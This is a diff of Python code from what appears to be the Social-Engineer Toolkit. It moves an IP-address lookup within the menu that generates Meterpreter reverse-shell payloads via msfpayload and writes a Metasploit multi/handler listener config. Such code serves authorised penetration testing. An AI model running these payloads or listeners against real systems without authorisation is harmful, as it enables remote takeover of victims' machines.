@@ -383,6 +383,10 @@ try:
                         if choice9 == "4":
                             choice9 = "windows/meterpreter/reverse_tcp_allports"
 
+                        if ipaddr == "":
+                            # grab ipaddr if not defined
+                            ipaddr = check_options("IPADDR=")
+
                     if choice1 == "shellcode/alphanum":
                         print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
                         subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/meterpreter.raw" % (path,choice9,choice2,portnum,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
@@ -395,8 +399,7 @@ try:
                         if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                             os.remove("%s/meta_config_multipyinjector" % (setdir))
                         while 1:
-                        
-                        
+                                                
                             if choice1 == "shellcode/multipyinject":
                                 print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                 choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
@@ -414,7 +417,11 @@ try:
                                     choice9 = "windows/meterpreter/reverse_tcp_allports"
                                 if choice9 == "5":
                                     choice9 = "windows/shell/reverse_tcp"
-                                # break out of loop, no longer needed
+                                # check the ipaddr
+                                if ipaddr == "":
+                                    # grab ipaddr if not defined
+                                    ipaddr = check_options("IPADDR=")
+                                # break out if not needed
                                 if choice9 == "6": break
                                 shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
                                 if shellcode_port == "": shellcode_port = "443"
@@ -422,9 +429,6 @@ try:
                                 # here we prep our meta config to listen on all the ports we want - free hugs all around
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
-                                if ipaddr == "":
-                                    # grab ipaddr if not defined
-                                    ipaddr = check_options("IPADDR=")
                                 if port_check == False:
                                     filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding true\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, ipaddr, shellcode_port))
                                     filewrite.close()
